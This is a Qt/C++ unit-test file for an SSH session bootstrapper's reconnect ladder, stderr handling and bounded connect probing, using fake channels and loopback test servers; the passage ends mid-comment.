// SessionBootstrap's connection-state machine and reconnect ladder (SPEC 5.6).
//
// The point of this gate is the path no live test can drive on demand: the
// remote session DYING. A live fixture can be wired and torn down, but it
// cannot be made to drop a channel at a chosen instant, ten times, on a
// millisecond budget. So the two side-effecting steps of a wire attempt —
// connectPool() and openChannelDevice() — are overridden here, and everything
// above them (state transitions, teardown ordering, backoff scheduling, the
// attempt cap) is the production code under test.
//
// The fake channel is a real SshChannelDevice subclass, not a QBuffer: the
// device type is part of SessionBootstrap's API (rpcDevice()) and its
// closeChannel() -> readChannelFinished() behaviour is exactly the mechanism
// that makes CodeharbordClient fail its pending calls.

#include "AgentStatusMonitor.h"
#include "CodeharbordClient.h"
#include "SessionBootstrap.h"
#include "SshChannelDevice.h"
#include "SshConnectionPool.h"

#include <QElapsedTimer>
#include <QFile>
#include <QFileInfo>
#include <QHostAddress>
#include <QList>
#include <QPointer>
#include <QProcess>
#include <QSignalSpy>
#include <QTcpServer>
#include <QTcpSocket>
#include <QTemporaryDir>
#include <QTest>
#include <QTimer>

#include <functional>
#include <optional>
#include <utility>

using ch::AgentStatusMonitor;
using ch::CodeharbordClient;
using ch::RpcError;
using ch::SessionBootstrap;
using ch::SshChannelDevice;
using ch::SshConnectionPool;

using State = SessionBootstrap::State;

namespace {

// 1 s of backoff becomes 1 ms, so the full ten-attempt ladder
// (1+2+5+10+30+60*5 = 348 s) runs in 348 ms. The SCHEDULE is asserted in
// unscaled seconds through reconnectScheduled(), so the compression never
// weakens what is checked.
constexpr double kTimeScale = 0.001;

// An SshChannelDevice with no SSH under it: open, writable, and droppable on
// command. writeData() must succeed or CodeharbordClient::call() refuses to
// register a pending callback, and the pending-call teardown is one of the
// things being proven here.
class FakeChannel : public SshChannelDevice {
public:
    explicit FakeChannel(SshConnectionPool::ChannelKind kind, QObject* parent)
        : SshChannelDevice(nullptr, kind, parent)
    {
        QIODevice::open(QIODevice::ReadWrite | QIODevice::Unbuffered);
    }

    // What a dead remote looks like to the device: EOF on the read channel,
    // emitted exactly as SshChannelDevice::pump() emits it.
    void dropRemote() { emit readChannelFinished(); }

    // What ordinary remote chatter looks like to the device: a line the peer
    // wrote to stderr. SshChannelDevice::pump() publishes stderr exactly this
    // way, and it is emphatically NOT a failure — codeharbor-bridge greets
    // every launch with one.
    void writeStderr(const QString& text) { emit channelError(text); }

    QByteArray written;

protected:
    qint64 writeData(const char* data, qint64 maxSize) override
    {
        written.append(data, maxSize);
        return maxSize;
    }
    qint64 readData(char*, qint64) override { return 0; }
};

// A local stand-in for an SSH endpoint, used by the cases that exercise the
// REAL probeEndpoint(). In its default mode it answers a new connection with an
// identification string, exactly as sshd does; muted, it accepts the connection
// and then says nothing forever — the "TCP is up but the SSH handshake never
// starts" hang that costs libssh a flat ten seconds.
class ProbeServer : public QTcpServer {
public:
    bool mute = false;
    int accepted = 0;

protected:
    void incomingConnection(qintptr descriptor) override
    {
        ++accepted;
        auto* peer = new QTcpSocket(this);
        peer->setSocketDescriptor(descriptor);
        if (mute)
            return;
        peer->write("SSH-2.0-probefixture\r\n");
        peer->flush();
    }
};

class TestBootstrap : public SessionBootstrap {
public:
    using SessionBootstrap::SessionBootstrap;

    bool connectOk = true;
    bool channelsOk = true;
    // The pre-flight is faked like the handshake is, EXCEPT where a case asks
    // for the production probe by setting realProbe (see the latency cases).
    bool probeOk = true;
    bool realProbe = false;
    int connectCalls = 0;
    int probeCalls = 0;
    QList<QPointer<FakeChannel>> channels;

    // Fired ONCE, from inside the very nested event loop the production
    // pre-flight is parked in, the next time a REAL probe starts.
    //
    // The only way to reach SessionBootstrap while an attempt is genuinely
    // stalled in probeEndpoint(). A wall-clock QTimer armed from the test body
    // cannot do it for a RETRY: the test is itself blocked inside that nested
    // loop, so it never regains control to arm anything until the probe has
    // already run its whole budget out. Delivered via a zero-timer rather than
    // called directly so it runs as an event of that loop — i.e. exactly as a
    // user clicking "disconnect" mid-freeze would.
    std::function<void()> onProbeStarted;

    FakeChannel* rpcChannel() const
    {
        return static_cast<FakeChannel*>(rpcDevice());
    }

protected:
    bool connectPool(const QString&, quint16, const QString&) override
    {
        ++connectCalls;
        return connectOk;
    }

    bool probeEndpoint(const QString& host, quint16 port,
                       QString* error) override
    {
        ++probeCalls;
        if (realProbe) {
            if (onProbeStarted)
                QTimer::singleShot(0, this, std::exchange(onProbeStarted, {}));
            return SessionBootstrap::probeEndpoint(host, port, error);
        }
        if (probeOk)
            return true;
        if (error)
            *error = QStringLiteral("endpoint is dark");
        return false;
    }

    SshChannelDevice* openChannelDevice(SshConnectionPool::ChannelKind kind,
                                        const QString&, const QString&) override
    {
        if (!channelsOk)
            return nullptr;
        auto* channel = new FakeChannel(kind, this);
        channels.append(channel);
        return channel;
    }
};

// One self-contained set of collaborators per test case.
struct Harness {
    QTemporaryDir dir;
    SshConnectionPool pool;
    CodeharbordClient client;
    AgentStatusMonitor monitor;
    TestBootstrap boot{&pool, &client, &monitor};
    QString host = QStringLiteral("example.invalid");
    quint16 port = 2222;

    Harness()
    {
        boot.setKnownHostsPath(dir.filePath(QStringLiteral("known_hosts")));
        boot.setReconnectTimeScale(kTimeScale);
    }

    bool wire()
    {
        return boot.connectAndWire(host, port, QStringLiteral("user"),
                                   QStringLiteral("/usr/bin/node"),
                                   QStringLiteral("/srv/codeharbor"));
    }

    // Point the harness at a local socket and let the production pre-flight run
    // against it.
    void useRealProbeAgainst(quint16 localPort)
    {
        host = QStringLiteral("127.0.0.1");
        port = localPort;
        boot.realProbe = true;
    }
};

// A free TCP port nothing is listening on: bind one, note it, drop the server.
quint16 refusedPort()
{
    QTcpServer probe;
    probe.listen(QHostAddress::LocalHost, 0);
    const quint16 port = probe.serverPort();
    probe.close();
    return port;
}

QList<State> states(const QSignalSpy& spy)
{
    QList<State> out;
    out.reserve(spy.size());
    for (const QList<QVariant>& call : spy)
        out.append(call.at(0).value<State>());
    return out;
}

} // namespace

class TstSessionBootstrap : public QObject {
    Q_OBJECT
private slots:
    void wiresAndReportsState();
    void initialConnectFailureDoesNotRetry();
    void channelLossReconnectsAndRewires();
    void agentChannelLossAlsoReconnects();
    void pendingCallsFailWhenTheSessionDies();
    void poolLossReconnects();
    void backoffLadderMatchesSpec();
    void retryDelaySequenceAndCap();
    void reconnectDisabledNeverSchedules();
    void disablingMidLadderStopsIt();
    void userDisconnectDoesNotReconnect();
    void uncappedLadderKeepsRetryingAtSixty();

    // Which channel news is a FAILURE and which is chatter.
    void remoteStderrIsDiagnosticNotError();
    void genuineChannelSetupFailureStillErrors();
    void channelLossCarriesThatChannelsLastRemoteWords();

    // Connect-stall bound and GUI responsiveness (this round's hunt).
    void refusedEndpointFailsFastAndCleanly();
    void muteEndpointIsBoundedByConnectTimeout();
    void probeKeepsTheEventLoopRunning();
    void reentrantConnectDuringProbeIsRefused();
    void darkEndpointNeverReachesTheBlockingHandshake();
    void ladderPaysOneBudgetPerRung();
    void disconnectDuringProbeCutsTheWaitShort();
    void disablingReconnectDuringProbeStopsTheLadder();
    void disconnectMidBackoffStopsImmediately();

    // Remote command construction from attacker-influenced profile fields.
    void remoteCommandsQuoteHostileProfileFields();
    void remoteEntryPointsSupportBothReleaseAndCheckoutLayouts();
};

// A cold wire walks Disconnected -> Connecting -> Wired exactly once and hands
// both transports over.
void TstSessionBootstrap::wiresAndReportsState()
{
    Harness h;
    QCOMPARE(h.boot.state(), State::Disconnected);
    QSignalSpy stateSpy(&h.boot, &SessionBootstrap::stateChanged);
    QSignalSpy wiredSpy(&h.boot, &SessionBootstrap::wired);

    QVERIFY(h.wire());

    QCOMPARE(states(stateSpy), (QList<State>{State::Connecting, State::Wired}));
    QCOMPARE(wiredSpy.size(), 1);
    QCOMPARE(h.boot.state(), State::Wired);
    QCOMPARE(h.boot.reconnectAttempt(), 0);
    QVERIFY(!h.boot.reconnectPending());
    QVERIFY(h.boot.rpcDevice() != nullptr);
    QVERIFY(h.boot.agentDevice() != nullptr);
    QCOMPARE(h.client.transport(),
             static_cast<QIODevice*>(h.boot.rpcDevice()));
    QCOMPARE(h.monitor.transport(),
             static_cast<QIODevice*>(h.boot.agentDevice()));
}

// A connect the user asked for and that never came up is reported to the
// caller, not retried behind its back: there is no session to survive yet.
void TstSessionBootstrap::initialConnectFailureDoesNotRetry()
{
    Harness h;
    h.boot.connectOk = false;
    QSignalSpy stateSpy(&h.boot, &SessionBootstrap::stateChanged);
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY(!h.wire());

    QCOMPARE(states(stateSpy), (QList<State>{State::Connecting, State::Failed}));
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY(errorSpy.at(0).at(0).toString().contains(QStringLiteral("failed")));
    QVERIFY(!h.boot.reconnectPending());
    QCOMPARE(h.boot.connectCalls, 1);

    // And it stays down: no timer was armed to change its mind.
    QTest::qWait(50);
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(h.boot.connectCalls, 1);
}

// The load-bearing case: the RPC channel dies, both devices are dropped, a
// retry is armed on the first rung of the ladder, and the session comes back.
void TstSessionBootstrap::channelLossReconnectsAndRewires()
{
    Harness h;
    QVERIFY(h.wire());
    FakeChannel* dead = h.boot.rpcChannel();
    QPointer<FakeChannel> deadAgent =
        static_cast<FakeChannel*>(h.boot.agentDevice());

    QSignalSpy stateSpy(&h.boot, &SessionBootstrap::stateChanged);
    QSignalSpy wiredSpy(&h.boot, &SessionBootstrap::wired);
    QSignalSpy scheduleSpy(&h.boot, &SessionBootstrap::reconnectScheduled);

    dead->dropRemote();

    // Torn down at once, both sides, and armed for the first retry.
    QCOMPARE(h.boot.state(), State::Reconnecting);
    QVERIFY(h.client.transport() == nullptr);
    QVERIFY(h.monitor.transport() == nullptr);
    QVERIFY(h.boot.reconnectPending());
    QCOMPARE(h.boot.nextReconnectDelaySeconds(), 1);
    QCOMPARE(scheduleSpy.size(), 1);
    QCOMPARE(scheduleSpy.at(0).at(0).toInt(), 1);  // attempt 1
    QCOMPARE(scheduleSpy.at(0).at(1).toInt(), 1);  // after 1 s

    QTRY_COMPARE(h.boot.state(), State::Wired);
    QCOMPARE(states(stateSpy),
             (QList<State>{State::Reconnecting, State::Wired}));
    QCOMPARE(wiredSpy.size(), 1);
    QCOMPARE(h.boot.connectCalls, 2);
    QCOMPARE(h.boot.reconnectAttempt(), 0);
    QVERIFY(!h.boot.reconnectPending());

    // Fresh channels, and the consumers hold the new ones.
    QVERIFY(h.boot.rpcDevice() != static_cast<SshChannelDevice*>(dead));
    QCOMPARE(h.client.transport(),
             static_cast<QIODevice*>(h.boot.rpcDevice()));
    QCOMPARE(h.monitor.transport(),
             static_cast<QIODevice*>(h.boot.agentDevice()));

    // The dropped devices are deleted, not leaked onto the parent.
    QTRY_VERIFY(deadAgent.isNull());
}

// The agent-status channel is the other half of the session; losing it means
// the remote side is gone too.
void TstSessionBootstrap::agentChannelLossAlsoReconnects()
{
    Harness h;
    QVERIFY(h.wire());
    auto* agent = static_cast<FakeChannel*>(h.boot.agentDevice());

    agent->dropRemote();

    QCOMPARE(h.boot.state(), State::Reconnecting);
    QTRY_COMPARE(h.boot.state(), State::Wired);
    QCOMPARE(h.boot.connectCalls, 2);
}

// CodeharbordClient fails its pending callbacks from onTransportClosed(), which
// only fires on transport EOF. SessionBootstrap must therefore close the RPC
// device BEFORE detaching it, or every in-flight call hangs forever.
void TstSessionBootstrap::pendingCallsFailWhenTheSessionDies()
{
    Harness h;
    QVERIFY(h.wire());

    std::optional<RpcError> failure;
    bool answered = false;
    h.client.call(QStringLiteral("workspace.getTree"), QJsonValue(),
                  [&](const QJsonValue&, std::optional<RpcError> err) {
                      answered = true;
                      failure = err;
                  });
    // The request really went out on the wire and is pending, not
    // short-circuited by call()'s own "cannot transmit" path.
    QVERIFY(h.boot.rpcChannel()->written.contains("workspace.getTree"));
    QVERIFY(!answered);

    h.boot.rpcChannel()->dropRemote();

    QVERIFY(answered);
    QVERIFY(failure.has_value());
    QCOMPARE(failure->message,
             QStringLiteral("transport closed with request pending"));

    // Same guarantee on a deliberate teardown, where nobody emits EOF for us:
    // unwire() must close the channel while it is still attached.
    QTRY_COMPARE(h.boot.state(), State::Wired);
    std::optional<RpcError> second;
    h.client.call(QStringLiteral("workspace.getTree"), QJsonValue(),
                  [&](const QJsonValue&, std::optional<RpcError> err) {
                      second = err;
                  });
    QVERIFY(!second.has_value());
    h.boot.disconnectSession();
    QVERIFY(second.has_value());
    QCOMPARE(second->message,
             QStringLiteral("transport closed with request pending"));
}

// A session-level fault (the pool itself going down) is a loss even if no
// channel reported EOF first.
void TstSessionBootstrap::poolLossReconnects()
{
    Harness h;
    QVERIFY(h.wire());

    emit h.pool.errorOccurred(QStringLiteral("Socket error: disconnected"));

    QCOMPARE(h.boot.state(), State::Reconnecting);
    QTRY_COMPARE(h.boot.state(), State::Wired);
    QCOMPARE(h.boot.connectCalls, 2);
}

// SPEC 5.6, identical to the vector tst_terminalcontroller pins for
// TerminalController::reconnectDelaySeconds(). These two ladders must not
// drift.
void TstSessionBootstrap::backoffLadderMatchesSpec()
{
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(-1), 1);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(0), 1);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(1), 2);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(2), 5);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(3), 10);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(4), 30);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(5), 60);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(6), 60);
    QCOMPARE(SessionBootstrap::reconnectDelaySeconds(100), 60);
}

// Every rung actually used by the scheduler, in order, and the cap that ends
// it: ten consecutive failures -> Failed, with the delay pinned at 60 s rather
// than growing without bound.
void TstSessionBootstrap::retryDelaySequenceAndCap()
{
    Harness h;
    QVERIFY(h.wire());
    QCOMPARE(h.boot.maxReconnectAttempts(),
             SessionBootstrap::kDefaultMaxReconnectAttempts);

    QList<int> attempts;
    QList<int> delays;
    connect(&h.boot, &SessionBootstrap::reconnectScheduled, this,
            [&](int attempt, int delaySeconds) {
                attempts.append(attempt);
                delays.append(delaySeconds);
            });
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    h.boot.connectOk = false;  // nothing will come back up
    h.boot.rpcChannel()->dropRemote();

    QTRY_COMPARE(h.boot.state(), State::Failed);

    // Printed so a test run shows the ladder it actually walked, not just that
    // it matched.
    qInfo() << "observed backoff seconds:" << delays << "attempts:" << attempts;
    QCOMPARE(delays, (QList<int>{1, 2, 5, 10, 30, 60, 60, 60, 60, 60}));
    QCOMPARE(attempts, (QList<int>{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}));
    QCOMPARE(h.boot.reconnectAttempt(), 10);
    QCOMPARE(h.boot.connectCalls, 11);  // the original wire plus ten retries
    QVERIFY(!h.boot.reconnectPending());
    QVERIFY(errorSpy.last().at(0).toString().contains(
        QStringLiteral("giving up")));

    // Terminal: nothing fires after the cap.
    QTest::qWait(100);
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(h.boot.connectCalls, 11);
}

// Reconnect turned off before the loss: the session is reported down and left
// down.
void TstSessionBootstrap::reconnectDisabledNeverSchedules()
{
    Harness h;
    h.boot.setReconnectEnabled(false);
    QVERIFY(!h.boot.reconnectEnabled());
    QVERIFY(h.wire());

    h.boot.rpcChannel()->dropRemote();

    QCOMPARE(h.boot.state(), State::Disconnected);
    QVERIFY(!h.boot.reconnectPending());
    QVERIFY(h.client.transport() == nullptr);
    QTest::qWait(50);
    QCOMPARE(h.boot.connectCalls, 1);
}

// Turned off with a retry already armed: the armed retry must be cancelled, not
// allowed one last shot.
void TstSessionBootstrap::disablingMidLadderStopsIt()
{
    Harness h;
    h.boot.connectOk = true;
    QVERIFY(h.wire());
    h.boot.connectOk = false;
    h.boot.rpcChannel()->dropRemote();
    QCOMPARE(h.boot.state(), State::Reconnecting);
    QVERIFY(h.boot.reconnectPending());

    h.boot.setReconnectEnabled(false);

    QVERIFY(!h.boot.reconnectPending());
    QCOMPARE(h.boot.state(), State::Disconnected);
    QTest::qWait(50);
    QCOMPARE(h.boot.connectCalls, 1);
    QCOMPARE(h.boot.state(), State::Disconnected);
}

// The user closed the session. It must stay closed.
void TstSessionBootstrap::userDisconnectDoesNotReconnect()
{
    Harness h;
    QVERIFY(h.wire());
    QSignalSpy stateSpy(&h.boot, &SessionBootstrap::stateChanged);

    h.boot.disconnectSession();

    QCOMPARE(states(stateSpy), (QList<State>{State::Disconnected}));
    QVERIFY(!h.boot.reconnectPending());
    QVERIFY(h.client.transport() == nullptr);
    QVERIFY(h.monitor.transport() == nullptr);
    QVERIFY(h.boot.rpcDevice() == nullptr);
    QVERIFY(h.boot.agentDevice() == nullptr);
    QTest::qWait(50);
    QCOMPARE(h.boot.state(), State::Disconnected);
    QCOMPARE(h.boot.connectCalls, 1);
}

// Opting out of the cap keeps the ladder alive at its last rung instead of
// escalating or giving up.
void TstSessionBootstrap::uncappedLadderKeepsRetryingAtSixty()
{
    Harness h;
    h.boot.setMaxReconnectAttempts(0);
    QVERIFY(h.wire());

    QList<int> delays;
    connect(&h.boot, &SessionBootstrap::reconnectScheduled, this,
            [&](int, int delaySeconds) { delays.append(delaySeconds); });

    h.boot.connectOk = false;
    h.boot.rpcChannel()->dropRemote();

    QTRY_VERIFY(delays.size() >= 14);
    QCOMPARE(h.boot.state(), State::Reconnecting);
    QCOMPARE(delays.mid(5, 9), QList<int>(9, 60));
    h.boot.setReconnectEnabled(false);  // stop the ladder before teardown
}

// ---------------------------------------------------------------------------
// Channel news classification.
//
// An SSH exec channel has exactly one stderr and the remote process writes
// whatever it likes to it, so SshChannelDevice::channelError() carries ordinary
// startup chatter. codeharbor-bridge opens with
//
//   codeharbor-bridge listening on /run/user/1000/codeharbor.sock
//
// on every launch. That used to be forwarded to SessionBootstrap::error(),
// which AppController shows to the user VERBATIM in a toast — so a session that
// had just come up perfectly greeted the user with error toasts announcing its
// own success. The stream is still published (it is the only explanation the
// remote side ever gives) but as a diagnostic, never as a verdict.
// ---------------------------------------------------------------------------

void TstSessionBootstrap::remoteStderrIsDiagnosticNotError()
{
    Harness h;
    QVERIFY(h.wire());

    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    QSignalSpy diagSpy(&h.boot, &SessionBootstrap::channelDiagnostic);
    QSignalSpy stateSpy(&h.boot, &SessionBootstrap::stateChanged);

    auto* agent = static_cast<FakeChannel*>(h.boot.agentDevice());
    agent->writeStderr(
        QStringLiteral("codeharbor-bridge listening on "
                       "/run/user/1000/codeharbor.sock\n"));

    // Published as diagnostics, trimmed, tagged with the channel it came from.
    QCOMPARE(diagSpy.size(), 1);
    QCOMPARE(diagSpy.at(0).at(0).toString(), QStringLiteral("codeharbor-bridge"));
    QCOMPARE(diagSpy.at(0).at(1).toString(),
             QStringLiteral("codeharbor-bridge listening on "
                            "/run/user/1000/codeharbor.sock"));

    // And NOT as a failure: no toast, and the session is untouched.
    QVERIFY2(errorSpy.isEmpty(),
             qPrintable(QStringLiteral("routine remote stderr was reported to "
                                       "the user as an error: %1")
                            .arg(errorSpy.value(0).value(0).toString())));
    QVERIFY(stateSpy.isEmpty());
    QCOMPARE(h.boot.state(), State::Wired);
    QVERIFY(!h.boot.reconnectPending());

    // Same on the RPC channel, and a blank line is not even worth reporting.
    h.boot.rpcChannel()->writeStderr(QStringLiteral("  \n"));
    QCOMPARE(diagSpy.size(), 1);
    QVERIFY(errorSpy.isEmpty());

    // The channel really dying is still a loss, still an error, still a
    // reconnect — stderr is what stops being a verdict, not EOF.
    agent->dropRemote();
    QCOMPARE(h.boot.state(), State::Reconnecting);
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY(errorSpy.at(0).at(0).toString().contains(
        QStringLiteral("codeharbor-bridge channel closed")));
}

// The other half of the contract: demoting stderr must not make a channel that
// genuinely fails to start go quiet. A user whose remote node path is wrong
// still has to be told.
void TstSessionBootstrap::genuineChannelSetupFailureStillErrors()
{
    Harness h;
    h.boot.channelsOk = false;  // openChannelDevice() hands back nothing
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QVERIFY(!h.wire());

    QCOMPARE(errorSpy.size(), 1);
    QVERIFY(errorSpy.at(0).at(0).toString().contains(
        QStringLiteral("could not start codeharbord over SSH")));
    QCOMPARE(h.boot.state(), State::Failed);
    QVERIFY(h.boot.rpcDevice() == nullptr);
    QVERIFY(h.client.transport() == nullptr);

    // A pool that refuses the connection outright is reported too.
    Harness dead;
    dead.boot.connectOk = false;
    QSignalSpy deadErrors(&dead.boot, &SessionBootstrap::error);
    QVERIFY(!dead.wire());
    QCOMPARE(deadErrors.size(), 1);
    QVERIFY(deadErrors.at(0).at(0).toString().contains(QStringLiteral("failed")));
}

// ---------------------------------------------------------------------------
// Connect stall and GUI responsiveness.
//
// Measured on this machine with the pre-flight DISABLED (setConnectTimeoutMs(0)
// hands the stall back to libssh), all of it on the calling thread:
//
//   reachable fixture 127.0.0.1:2222   ~77 ms   ok
//   closed port       127.0.0.1:<free>  ~0 ms   "Connection refused"
//   mute TCP peer     127.0.0.1:<mute> 10016 ms "Timeout connecting to ..."
//   black-holed IP    10.255.255.1:22  10006 ms "Timeout connecting to ..."
//
// Ten seconds of a frozen window per attempt, repeated once per rung of the
// reconnect ladder. The cases below pin the bound that replaces it, and — more
// importantly than the number — that the event loop keeps turning while it
// runs. They use real sockets on loopback and a 120 ms budget, so the whole
// block costs a fraction of a second.
//
// The budget is a TEST-CHOSEN number (setConnectTimeoutMs is production API,
// not a test seam bolted on), so it is compressed as far as the assertions
// allow: this is a DEFAULT-suite target and nothing here may spend real wall
// clock waiting for a remote endpoint. The only cases that name a large budget
// are the two cancellation ones, and they exist precisely to prove the budget
// is NEVER waited out — they fail by taking that long.
// ---------------------------------------------------------------------------

namespace {
constexpr int kProbeBudgetMs = 120;
// Generous ceiling: the assertion is "bounded", not "fast to the millisecond",
// and a loaded CI box must not turn a real bound into a flake.
constexpr int kProbeCeilingMs = 3000;
} // namespace

// A port nobody is listening on is refused by the kernel at once: no wait, no
// libssh, State::Failed, and nothing left attached to the consumers.
void TstSessionBootstrap::refusedEndpointFailsFastAndCleanly()
{
    Harness h;
    h.useRealProbeAgainst(refusedPort());
    h.boot.setConnectTimeoutMs(kProbeBudgetMs);
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QElapsedTimer clock;
    clock.start();
    QVERIFY(!h.wire());
    const qint64 elapsed = clock.elapsed();

    qInfo() << "refused endpoint: connectAndWire blocked" << elapsed << "ms";
    QVERIFY2(elapsed < kProbeBudgetMs,
             qPrintable(QStringLiteral("refusal took %1 ms").arg(elapsed)));
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(h.boot.connectCalls, 0);  // libssh was never entered
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY(errorSpy.at(0).at(0).toString().contains(
        QStringLiteral("cannot reach")));
    QVERIFY(h.boot.rpcDevice() == nullptr);
    QVERIFY(h.boot.agentDevice() == nullptr);
    QVERIFY(h.client.transport() == nullptr);
    QVERIFY(h.monitor.transport() == nullptr);
    QVERIFY(!h.boot.reconnectPending());
}

// The expensive case: TCP comes up and the peer then says nothing. libssh
// charges a flat ten seconds for this; the pre-flight charges what we asked
// for, and still ends in a clean Failed with nothing half-wired.
void TstSessionBootstrap::muteEndpointIsBoundedByConnectTimeout()
{
    ProbeServer server;
    server.mute = true;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    h.boot.setConnectTimeoutMs(kProbeBudgetMs);
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);

    QElapsedTimer clock;
    clock.start();
    QVERIFY(!h.wire());
    const qint64 elapsed = clock.elapsed();

    qInfo() << "mute endpoint: connectAndWire blocked" << elapsed
            << "ms for a" << kProbeBudgetMs << "ms budget";
    QCOMPARE(server.accepted, 1);  // the TCP connection really was established
    QVERIFY2(elapsed >= kProbeBudgetMs,
             "returned before the budget: the probe cannot have waited");
    QVERIFY2(elapsed < kProbeCeilingMs,
             qPrintable(QStringLiteral("mute endpoint stalled %1 ms").arg(elapsed)));
    QCOMPARE(h.boot.state(), State::Failed);
    QCOMPARE(h.boot.connectCalls, 0);
    QCOMPARE(errorSpy.size(), 1);
    QVERIFY(errorSpy.at(0).at(0).toString().contains(
        QStringLiteral("did not answer within")));
    QVERIFY(h.boot.rpcDevice() == nullptr);
    QVERIFY(h.client.transport() == nullptr);

    // And the measured cost is reported through the production accessor, not
    // only by this test's stopwatch.
    QVERIFY(h.boot.lastAttemptMs() >= kProbeBudgetMs);
}

// The point of the whole exercise. A blocking wait (waitForConnected() or
// libssh) starves the event loop: no repaints, no timers, a grey window. The
// pre-flight must let the loop keep turning while it waits.
void TstSessionBootstrap::probeKeepsTheEventLoopRunning()
{
    ProbeServer server;
    server.mute = true;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    h.boot.setConnectTimeoutMs(kProbeBudgetMs);

    int ticks = 0;
    QTimer heartbeat;
    // Fast enough that a compressed budget still yields a decisive count.
    heartbeat.setInterval(10);
    connect(&heartbeat, &QTimer::timeout, this, [&ticks] { ++ticks; });
    heartbeat.start();

    QVERIFY(!h.wire());
    heartbeat.stop();

    qInfo() << "event-loop ticks during a" << kProbeBudgetMs
            << "ms probe:" << ticks;
    // A 120 ms stall at 10 ms per tick is ~12; anything above a handful proves
    // the loop ran. Zero is what a blocking wait scores.
    QVERIFY2(ticks >= 5,
             qPrintable(QStringLiteral("only %1 timer ticks: the event loop "
                                       "was starved")
                            .arg(ticks)));
}

// The nested event loop is only safe if it cannot be re-entered. A second
// connect request arriving mid-probe must be refused, not allowed to rewrite
// the target of the attempt already in flight.
void TstSessionBootstrap::reentrantConnectDuringProbeIsRefused()
{
    ProbeServer server;
    server.mute = true;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    h.boot.setConnectTimeoutMs(kProbeBudgetMs);

    bool secondReturned = false;
    bool secondResult = true;
    // Comfortably inside the budget, so the re-entrant call lands while the
    // pre-flight is genuinely parked rather than after it has unwound.
    QTimer::singleShot(30, &h.boot, [&] {
        secondResult = h.boot.connectAndWire(QStringLiteral("127.0.0.1"), 22,
                                             QStringLiteral("other"),
                                             QStringLiteral("/usr/bin/node"),
                                             QStringLiteral("/srv/other"));
        secondReturned = true;
    });

    QVERIFY(!h.wire());

    QVERIFY2(secondReturned, "the re-entrant call never ran inside the probe");
    QVERIFY(!secondResult);
    QCOMPARE(server.accepted, 1);  // the refused call opened no second socket
    QCOMPARE(h.boot.probeCalls, 1);
    QCOMPARE(h.boot.state(), State::Failed);
}

// Reconnect-storm cost. With the endpoint dark, every rung of the ladder used
// to pay libssh's full connect stall on the GUI thread — ten rungs, ten
// freezes. The pre-flight has to short-circuit before connectPool() on EVERY
// attempt, not just the first.
void TstSessionBootstrap::darkEndpointNeverReachesTheBlockingHandshake()
{
    Harness h;
    QVERIFY(h.wire());  // comes up once

    h.boot.probeOk = false;  // and the endpoint goes dark
    QSignalSpy errorSpy(&h.boot, &SessionBootstrap::error);
    h.boot.rpcChannel()->dropRemote();

    QTRY_COMPARE(h.boot.state(), State::Failed);
    QCOMPARE(h.boot.probeCalls, 11);   // the original wire plus ten retries
    QCOMPARE(h.boot.connectCalls, 1);  // ...and libssh was entered only once
    QVERIFY(errorSpy.at(1).at(0).toString().contains(
        QStringLiteral("endpoint is dark")));
}

// Reconnect-storm cost, measured end to end against a real socket. Every rung
// of the ladder pays one connect budget and no more: the stall per retry is
// bounded and does not compound, and libssh is never entered at all.
void TstSessionBootstrap::ladderPaysOneBudgetPerRung()
{
    ProbeServer server;
    QVERIFY(server.listen(QHostAddress::LocalHost, 0));

    Harness h;
    h.useRealProbeAgainst(server.serverPort());
    h.boot.setConnectTimeoutMs(kProbeBudgetMs);
    // Pure sleeping proves nothing HERE — the schedule itself is pinned by
    // backoffLadderMatchesSpec()/retryDelaySequenceAndCap() — so the rungs are
    // compressed hard and the connect budget is left as the dominant term,
    // which is the only thing this case measures.
    h.boot.setReconnectTimeScale(0.01);  // 1 s rung -> 10 ms
    h.boot.setMaxReconnectAttempts(3);

    QVERIFY(h.wire());  // the server answers, so the wire succeeds
    QCOMPARE(h.boot.probeCalls, 1);

    server.mute = true;  // now it goes quiet: every retry burns the full budget
    QElapsedTimer clock;
    clock.start();
    h.boot.rpcChannel()->dropRemote();

    QTRY_COMPARE_WITH_TIMEOUT(h.boot.state(), State::Failed, 20000);
    const qint64 elapsed = clock.elapsed();

    // Rungs 1, 2 and 5 s scaled by 0.01 = 80 ms of waiting, plus one connect
    // budget per attempt.
    const qint64 ladderMs = 80 + 3 * kProbeBudgetMs;
    qInfo() << "three dark rungs took" << elapsed << "ms (budget"
            << kProbeBudgetMs << "ms/attempt, ladder floor" << ladderMs << "ms)";
    QCOMPARE(h.boot.probeCalls, 4);    // the initial wire plus three retries
    QCOMPARE(h.boot.connectCalls, 1);  // libssh entered only for the live one
    QVERIFY2(elapsed < ladderMs * 3,
             qPrintable(QStringLiteral("ladder cost %1 ms against a %2 ms "
                                       "floor: the stall is compounding")
                            .arg(elapsed)
                            .arg(ladderMs)));
    QVERIFY(!h.boot.reconnectPending());
}

// The freeze the user can actually get out of. disconnectSession() called from
// the event loop WHILE a connect is stalled in its pre-flight must cut the wait
// short instead of running out the budget, and must leave the session down —
